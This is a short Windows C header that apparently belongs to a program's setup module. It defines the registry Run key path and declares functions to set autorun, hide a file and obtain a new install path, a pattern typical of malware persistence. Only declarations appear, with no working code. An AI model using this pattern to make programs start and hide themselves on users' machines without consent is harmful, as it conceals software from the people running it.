#ifndef __SETUP_H__
#define __SETUP_H__

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <conio.h>
#include <windows.h>

#define AUTORUN "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
#define LEN_VALUE_NAME 1024

BOOL setAutoRun(CONST CHAR *currPath, CONST CHAR *nameProg);

BOOL setHidden(CONST CHAR *path);

INT getNewPath(CHAR *newPath, DWORD size);

#endif // __SETUP_H__
